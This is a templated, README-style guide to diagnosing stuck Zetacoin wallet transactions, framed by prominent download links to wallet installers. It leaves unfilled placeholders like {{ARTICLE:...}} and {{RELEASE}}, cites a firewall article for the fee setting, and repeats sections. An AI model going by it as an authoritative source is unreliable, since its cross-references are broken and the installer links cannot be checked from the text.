![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">A Stuck Zetacoin Transaction: What to Do</h1>

<p align="center">How a Zetacoin payment moves, confirms and settles, and what to do when it does not.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

A Zetacoin transaction that stays unconfirmed is almost always a fee or connectivity problem. Check the peer count first, then whether the transaction actually reached the network, then the fee that was paid. If it never propagated, rebroadcasting or resending is the fix. There is no way to cancel a confirmed transaction.

## Three states that look the same

From the wallet, a stuck transaction looks identical whether it was broadcast and ignored, never broadcast at all, or already confirmed on a chain the wallet cannot see.

Telling them apart takes two checks: the peer count and a public explorer. If the wallet has peers and the explorer shows the transaction, it exists and is waiting. If the explorer does not show it, it never reached the network. If the wallet has no peers, nothing can be concluded until connectivity returns.

The full walk-through, with the checks in order, is in [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md).

## Checking the peer count

A wallet with zero peers cannot broadcast. The transaction sits in the local wallet, marked as sent, while the network has never heard of it.

That state resolves itself when connectivity returns, or when the client is restarted with a working connection. It does not resolve by waiting, because nothing is waiting on the other end.

Connectivity problems are covered in {{ARTICLE:zetacoin-wallet-zero-peer-connections}}, and the checks there apply before any fee discussion.

## Checking the fee

The recommended fee is `paytxfee=0.001` in `zetacoin.conf`. A transaction paying nothing, or paying far less after a manual change, is unattractive to include and can wait a long time on a chain where block space is abundant but not infinite.

Raising the fee for future transactions is a configuration change and a restart. For the transaction already sent, most wallets simply wait; replacing it is a specialised operation and not the first thing to attempt.

For the background behind this step, [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md) covers the same ground in more detail.

## When it never reached the network

If the explorer does not show the transaction and the wallet does, the transaction needs to be broadcast again. Restarting the client with a working connection often does it, because the wallet rebroadcasts pending transactions on startup.

If it still does not appear, sending it again  -  with the original treated as void because it never propagated  -  is the practical route. The risk of a duplicate exists only if both versions eventually confirm, which cannot happen to a transaction that never left the machine.

## When it did reach the network

If the explorer shows the transaction, it exists. It will confirm or it will be dropped from mempools eventually through expiry, and there is nothing to fix locally.

The useful action is patience plus a check on the fee that was actually paid. If the fee was set to zero deliberately, the wait is the consequence; if it was the recommended value, the transaction will confirm as soon as a block includes it, which on a 30-second chain is usually soon.

## What cannot be done

A confirmed transaction cannot be cancelled, reversed or recalled. The chain has no administrator, no support desk with an override, and no mechanism for undoing a payment.

That matters because the most common "fix" offered online is a service that claims to reverse a transaction for a fee. It cannot, and the request usually escalates to asking for the wallet file or a passphrase.

## Avoiding the situation

Keep the recommended fee, keep the client synced, and check peers before sending anything important. For large amounts, send a small test first; it is slower and it turns a mistake into a cheap lesson.

If you are sending to an exchange, check its confirmation requirement before sending, so a pending deposit is not mistaken for a stuck transaction.

## Common questions

### Can I cancel a Zetacoin transaction?

No. Before confirmation you can only wait for it to drop or be replaced; after confirmation it is final.

### Why is my transaction still unconfirmed?

Either the fee is too low, or the wallet has no peers and the transaction never propagated.

### Will it confirm eventually?

If it reached the network and paid a reasonable fee, yes. If it never propagated, no amount of waiting helps.

### Does restarting the wallet help?

It can, because the client rebroadcasts pending transactions when it starts with a working connection.

## The short version

Peers, then propagation, then fee. If it reached the network, wait. If it did not, rebroadcast. If it confirmed, it is done.

Related pages: {{ARTICLE:zetacoin-transaction-confirmations}} for what confirmation means, {{ARTICLE:send-and-receive-zetacoin}} for the transfer steps, {{ARTICLE:zetacoin-wallet-ports-and-firewall}} for the fee setting, and {{ARTICLE:zetacoin-wallet-not-syncing-fix}} if the client cannot see the chain. The current client is on {{RELEASE}}.

## Why waiting is usually the right first move

On a chain with 30-second blocks, a transaction that reached peers and paid a reasonable fee is included quickly. If it has not been included, either it did not reach peers or the fee was set below what nodes will relay.

Both are diagnosable within a minute, and neither is repaired by reinstalling anything. The wallet's history tab and a public explorer between them answer the question of whether the transaction exists in the network's view.

## What to change for next time

Set the fee to the recommended value and leave it there. Check the peer count before sending anything important, because a wallet with no peers cannot broadcast and will look as though it sent something it did not.

For large amounts, send a small test transaction first. It is the same habit that prevents address mistakes, and it costs a fraction of the amount to learn that something is wrong.

{{ARTICLE:zetacoin-transaction-confirmations}} covers how confirmations accumulate, and {{ARTICLE:zetacoin-wallet-ports-and-firewall}} covers the fee setting that prevents most of these cases.

## What to say if you contact support

Include the transaction reference, the amount, the address you sent to, and what the explorer shows. That set answers the first three questions anyone would ask, and it turns a conversation into a diagnosis.

Do not include the wallet file or a passphrase. No support process needs either, and a request for them is the beginning of a theft rather than a fix.

{{ARTICLE:send-and-receive-zetacoin}} covers the transfer itself, and {{ARTICLE:zetacoin-address-format-prefix}} covers the address check that prevents the worst version of this problem.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md)
- [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md)
- [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md)
